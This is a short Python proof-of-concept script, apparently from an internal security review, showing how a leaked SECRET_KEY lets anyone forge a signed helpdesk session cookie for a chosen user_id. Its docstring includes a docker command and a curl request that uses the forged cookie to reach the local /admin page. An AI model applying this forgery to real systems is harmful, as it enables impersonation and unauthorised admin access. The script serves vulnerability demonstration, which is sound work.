#!/usr/bin/env python3
"""Proof of concept for V5: forge a signed session cookie with the leaked key.

Run it with the built image, mounting the repository over /app:
    docker run --rm -v "$PWD:/app" -w /app helpdesk-app \
      python scripts/forge_session.py 4

Then use the printed cookie:
    curl -b "helpdesk_session=<cookie>" http://localhost:8000/admin

This is a demonstration on our own application only.
"""

import base64
import json
import pathlib
import sys

from itsdangerous import TimestampSigner

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from app.config import SECRET_KEY

user_id = int(sys.argv[1]) if len(sys.argv) > 1 else 4
payload = base64.b64encode(json.dumps({"user_id": user_id}).encode())
cookie = TimestampSigner(SECRET_KEY).sign(payload).decode()
print(cookie)
